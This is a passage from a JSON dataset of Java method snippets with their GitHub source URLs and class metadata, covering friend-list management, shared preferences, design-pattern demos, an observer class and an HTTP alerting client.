null) {            coolDown = new HashMap<>();            return true;        } else {            if (coolDown.get(QQ) != null) {                return coolDown.get(QQ).compareTo(new SimpleDateFormat(\"HH:mm\").format(new Date())) < 0;            } else {                return true;            }        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load() {        if (!directory.exists()) {            try {                directory.createNewFile();            } catch (IOException e) {                e.printStackTrace();            }        }        loadFriends();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "unload", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unload() {        saveFriends();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "setDirectory", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDirectory(File directory) {        this.directory = directory;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "saveFriends", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void saveFriends() {        if (directory.exists()) {            try (Writer writer = new FileWriter(directory)) {                writer.write(new GsonBuilder().setPrettyPrinting().create().toJson(getRegistry()));            } catch (IOException e) {                directory.delete();            }        }     }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "loadFriends", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadFriends() {        if (!directory.exists()) {            return;        }        try (FileReader inFile = new FileReader(directory)) {            setRegistry(new GsonBuilder().setPrettyPrinting().create().fromJson(inFile, new TypeToken<ArrayList<Friend>>() {            }.getType()));            if (getRegistry() == null)                setRegistry(new ArrayList<>());        } catch (Exception ignored) {        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "addFriend", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addFriend(String name) {        include(new Friend(name));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "addFriend", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addFriend(String name, String alias) {        include(new Friend(name, alias));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFriend", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Friend", "snippet": "    public Friend getFriend(String ign) {        for (Friend friend : getRegistry()) {            if (friend.getName().equalsIgnoreCase(ign)) {                return friend;            }        }        return null;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "isFriend", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFriend(String ign) {        return getFriend(ign) != null;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "clearFriends", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearFriends() {        clear();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "removeFriend", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeFriend(String name) {        Friend f = getFriend(name);        if (f != null) {            remove(f);        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/friend/FriendManager.java", "stars": "12", "class": {"name": "FriendManager", "extends": "ListManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        Bank icbcBank = new ICBCBank(new DepositAccount());        Account icbcAccount = icbcBank.showAccount();        icbcAccount.showAccountType();        Bank icbcBank2 = new ICBCBank(new CurrentAccount());        Account icbcAccount2 = icbcBank2.showAccount();        icbcAccount2.showAccountType();        Bank abcBank = new ABCBank(new CurrentAccount());        Account abcAccount = abcBank.showAccount();        abcAccount.showAccountType();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/bridge/BankTest.java", "stars": "2", "class": {"name": "BankTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getApi() {        return \"user/login\";    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/LoginApi.java", "stars": "1", "class": {"name": "LoginApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "setAccount", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "LoginApi", "snippet": "    public LoginApi setAccount(String account) {        this.account = account;        return this;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/LoginApi.java", "stars": "1", "class": {"name": "LoginApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "setPwd", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "LoginApi", "snippet": "    public LoginApi setPwd(String pwd) {        this.pwd = pwd;        return this;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/LoginApi.java", "stars": "1", "class": {"name": "LoginApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "setFingerPrint", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "LoginApi", "snippet": "    public LoginApi setFingerPrint(String fingerPrint) {        this.fingerPrint = fingerPrint;        return this;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/request/LoginApi.java", "stars": "1", "class": {"name": "LoginApi", "extends": null, "implements": ["IRequestApi"], "modifiers": ["public"]}}, {"method_name": "clear", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void clear(Context context) {        getPrefs(context).edit().clear().apply();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "save", "params": ["Context", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void save(Context context, String key, String value) {        getPrefs(context).edit().putString(key, value).apply();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": ["Context", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String get(Context context, String key, String defaultValue) {        ObscuredSharedPreferences obscuredSharedPreferences = getPrefs(context);        if (obscuredSharedPreferences != null) {            return obscuredSharedPreferences.getString(key, defaultValue);        } else {            return defaultValue;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "save", "params": ["Context", "String", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void save(Context context, String key, boolean value) {        getPrefs(context).edit().putBoolean(key, value).apply();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": ["Context", "String", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "Boolean", "snippet": "    public static Boolean get(Context context, String key, boolean defaultValue) {        return getPrefs(context).getBoolean(key, defaultValue);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "save", "params": ["Context", "String", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void save(Context context, String key, long value) {        getPrefs(context).edit().putLong(key, value).apply();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": ["Context", "String", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long get(Context context, String key, long defaultValue) {        return getPrefs(context).getLong(key, defaultValue);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "save", "params": ["Context", "String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void save(Context context, String key, int value) {        getPrefs(context).edit().putInt(key, value).apply();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": ["Context", "String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int get(Context context, String key, int defaultValue) {        return getPrefs(context).getInt(key, defaultValue);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "contains", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Boolean", "snippet": "    public static Boolean contains(Context context, String key) {        return getPrefs(context).contains(key);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "remove", "params": ["Context", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void remove(Context context, String key) {        getPrefs(context).edit().remove(key).apply();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPrefs", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "ObscuredSharedPreferences", "snippet": "    public static ObscuredSharedPreferences getPrefs(Context context) {        if (context != null) {            return new ObscuredSharedPreferences(context, context.getSharedPreferences(Constants.PREFS_FILE, Context.MODE_PRIVATE));        } else {            return null;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/PrefUtils.java", "stars": "4", "class": {"name": "PrefUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "eat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void eat()\t{\t\tSystem.out.println(\"\u5ba0\u7269\u559c\u6b22\u5403\u9c7c\uff01\");\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/duotai/Chongwu.java", "stars": "2", "class": {"name": "Chongwu", "extends": "Pet", "implements": null, "modifiers": ["public"]}}, {"method_name": "setModelPose", "params": ["AbstractClientPlayerEntity", "CallbackInfo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModelPose(AbstractClientPlayerEntity abstractClientPlayerEntity, CallbackInfo callbackInfo){        PlayerEntityModel<AbstractClientPlayerEntity> playerEntityModel = this.getModel();        if(abstractClientPlayerEntity instanceof CameraEntity){            playerEntityModel.setVisible(false);            playerEntityModel.head.visible = true;            playerEntityModel.isSneaking = false;            playerEntityModel.helmet.visible = true;            callbackInfo.cancel();        }    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/mixin/PlayerEntityRendererMixin.java", "stars": "5", "class": {"name": "PlayerEntityRendererMixin", "extends": "LivingEntityRenderer", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "renderLabelIfPresent", "params": ["AbstractClientPlayerEntity", "String", "MatrixStack", "VertexConsumerProvider", "int", "CallbackInfo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void renderLabelIfPresent(AbstractClientPlayerEntity abstractClientPlayerEntity, String text, MatrixStack matrixStack, VertexConsumerProvider vertexConsumerProvider, int i, CallbackInfo callbackInfo){        if(abstractClientPlayerEntity instanceof CameraEntity) {            CameraEntity cameraEntity = (CameraEntity) abstractClientPlayerEntity;            if(cameraEntity.isLive()){                matrixStack.push();                matrixStack.translate(0, 0.2f, 0);                super.renderLabelIfPresent(abstractClientPlayerEntity, Formatting.RED + \"\u25cf LIVE \u25cf\", matrixStack, vertexConsumerProvider, i);                matrixStack.pop();            }        }    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/mixin/PlayerEntityRendererMixin.java", "stars": "5", "class": {"name": "PlayerEntityRendererMixin", "extends": "LivingEntityRenderer", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "attachObserver", "params": ["Observer<A>"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void attachObserver(Observer<A> observer) {        if (observer == null) {            throw new IllegalArgumentException();        }        if (!observers.contains(observer)) {            observers.add(observer);        }    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/observer/Observable.java", "stars": "3", "class": {"name": "Observable", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "detachObserver", "params": ["Observer<A>"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void detachObserver(Observer<A> observer) {        if (observer == null || !observers.contains(observer)) {            return;        }        observers.remove(observer);    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/observer/Observable.java", "stars": "3", "class": {"name": "Observable", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "detachObservers", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void detachObservers() {        observers.removeAllElements();    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/observer/Observable.java", "stars": "3", "class": {"name": "Observable", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "notifyObservers", "params": ["A"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void notifyObservers(A action) {        observers.stream().forEach(observer -> {            observer.update(action);        });    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/observer/Observable.java", "stars": "3", "class": {"name": "Observable", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "countObservers", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "int", "snippet": "    public synchronized int countObservers() {        return observers.size();    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/observer/Observable.java", "stars": "3", "class": {"name": "Observable", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "alert", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Result", "snippet": "  public Result alert() throws IOException {    Result result = new Result();    URL url = new URL(\"http://\" + server + \":\" + port + path);    HttpURLConnection conn = (HttpURLConnection) url.openConnection();    conn.setConnectTimeout(3000);    conn.setDoInput(true);    conn.setDoOutput(true);    conn.setRequestMethod(\"POST\");    conn.setUseCaches(false);    // Request data    String requestDataStr = getRequesData();    logger.info(\"\u8bf7\u6c42\u7684IMS URL\u5730\u5740\u548c\u53c2\u6570\uff1a\" + getIMSUrlParam());    byte[] requestData = requestDataStr.getBytes(encode);    OutputStream os = conn.getOutputStream();    os.write(requestData);    // Send alert and get result    int response = conn.getResponseCode();    if (response == HttpURLConnection.HTTP_OK) {      InputStream is = conn.getInputStream();      ByteArrayOutputStream baos = new ByteArrayOutputStream();      byte[] resultData = new byte[1024];      int len;      while ((len = is.read(resultData)) != -1) {        baos.write(resultData, 0, len);      }      // Json to java      String resultStr = new String(baos.toByteArray(), Charset.defaultCharset());      logger.info(\"IMS\u63a5\u53e3\u8fd4\u56deJSON\u6570\u636e\uff1a\" + resultStr);      result = new Gson().fromJson(resultStr, Result.class);    } else {      logger.error(\"\u8bf7\u6c42IMS\u63a5\u53e3\u5931\u8d25, responseCode=\" + response + \" !!!\");    }    return result;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getRequesData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRequesData() {    StringBuilder sb = new StringBuilder();    try {      sb.append(\"sub_system_id=\").append(subSystemID);      // sb.append(\"&alert_title=\").append(URLEncoder.encode(alertTitle, encode));      sb.append(\"&alert_title=\").append(alertTitle);      if (alertID != null && !alertID.isEmpty()){        sb.append(\"&alert_id=\").append(alertID);      }      sb.append(\"&alert_level=\").append(alertLevel.ordinal());      if (alertObj != null && !alertObj.isEmpty()){        // sb.append(\"&alert_obj=\").append(URLEncoder.encode(alertObj, encode));        sb.append(\"&alert_obj=\").append(alertObj);      }      if (alertInfo != null && !alertInfo.isEmpty()){        // sb.append(\"&alert_info=\").append(URLEncoder.encode(alertInfo, encode));        sb.append(\"&alert_info=\").append(alertInfo);      }      if (alertIP != null && !alertIP.isEmpty()){        sb.append(\"&alert_ip=\").append(alertIP);      }      //sb.append(\"&to_ecc=\").append(toECC);      //sb.append(\"&can_recover=\").append(canRecover);      if (alertWays != null && !alertWays.isEmpty()) {        sb.append(\"&alert_way=\");        for (Integer way : alertWays) {          sb.append(way).append(\",\");        }        sb.deleteCharAt(sb.length() - 1);      }      if (alertReceivers != null && !alertReceivers.isEmpty()) {        sb.append(\"&alert_reciver=\");        for (String receiver : alertReceivers) {          sb.append(receiver).append(\",\");        }        sb.deleteCharAt(sb.length() - 1);      }    } catch (Exception e) {      logger.error(\"Failed to generate request data!!!\");      logger.error(e.getMessage(), e);    }    return sb.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAlertID", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAlertID(String alertID) {    this.alertID = alertID;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSubSystemID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getSubSystemID() {    return subSystemID;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAlertTitle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAlertTitle() {    return alertTitle;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAlertLevel", "params": ["AlertLevel"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAlertLevel(AlertLevel alertLevel) {    this.alertLevel = alertLevel;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAlertObj", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAlertObj(String alertObj) {    this.alertObj = alertObj;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAlertInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAlertInfo(String alertInfo) {    this.alertInfo = alertInfo;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setToECC", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setToECC(int toECC) {    this.toECC = toECC;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCanRecover", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCanRecover(int canRecover) {    this.canRecover = canRecover;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addAlertWay", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addAlertWay(int way) {    if (alertWays == null){      alertWays = new HashSet<>();    }    alertWays.add(way);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAlertReceivers", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAlertReceivers(List<String> alertReceivers) {    this.alertReceivers = alertReceivers;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generateAlertID", "params": ["int", "String", "AlertLevel", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String generateAlertID(int subSystemID, String alertTitle, AlertLevel alertLevel,      String jobID) {    MessageDigest md5;    try {      md5 = MessageDigest.getInstance(\"MD5\");    } catch (NoSuchAlgorithmException e) {      e.printStackTrace();      return null;    }    String source = subSystemID + alertTitle + alertLevel.ordinal() + jobID;    byte[] srcByteArray = md5.digest(source.getBytes(Charset.defaultCharset()));    return new String(new Hex().encode(srcByteArray), Charset.defaultCharset());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIMSUrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getIMSUrlParam() {    StringBuilder sb = new StringBuilder();    try {      sb.append(\"sub_system_id=\").append(subSystemID);      sb.append(\"&alert_title=\").append(alertTitle);      if (alertID != null && !alertID.isEmpty()){        sb.append(\"&alert_id=\").append(alertID);      }      sb.append(\"&alert_level=\").append(alertLevel.ordinal());      if (alertObj != null && !alertObj.isEmpty()){        sb.append(\"&alert_obj=\").append(alertObj);      }      if (alertInfo != null && !alertInfo.isEmpty()){        sb.append(\"&alert_info=\").append(alertInfo);      }      if (alertIP != null && !alertIP.isEmpty()){        sb.append(\"&alert_ip=\").append(alertIP);      }      if (alertWays != null && !alertWays.isEmpty()) {        sb.append(\"&alert_way=\");        for (Integer way : alertWays) {          sb.append(way).append(\",\");        }        sb.deleteCharAt(sb.length() - 1);      }      if (alertReceivers != null && !alertReceivers.isEmpty()) {        sb.append(\"&alert_reciver=\");        for (String receiver : alertReceivers) {          sb.append(receiver).append(\",\");        }        sb.deleteCharAt(sb.length() - 1);      }    } catch (Exception e) {      logger.error(\"Failed to generate request data!!!\");      logger.error(e.getMessage(), e);    }    return sb.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "IMSAlert", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {      return \"IMS\u8fd4\u56de\u4ee3\u7801\uff1a\" + this.resultCode + \", IMS\u8fd4\u56de\u6d88\u606f\uff1a\" + this.resultMsg + \", IMS\u8fd4\u56de\u65f6\u95f4\uff1a\" + this.systemTime;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getResCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getResCode() {      return resCode;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getResInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getResInfo() {      return resInfo;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getResultCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getResultCode() {      return resultCode;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setResultCode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setResultCode(String resultCode) {      this.resultCode = resultCode;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getResultMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getResultMsg() {      return resultMsg;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-alerter/src/main/java/com/webank/wedatasphere/schedulis/ims/IMSAlert.java", "stars": "18", "class": {"name": "Result", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": 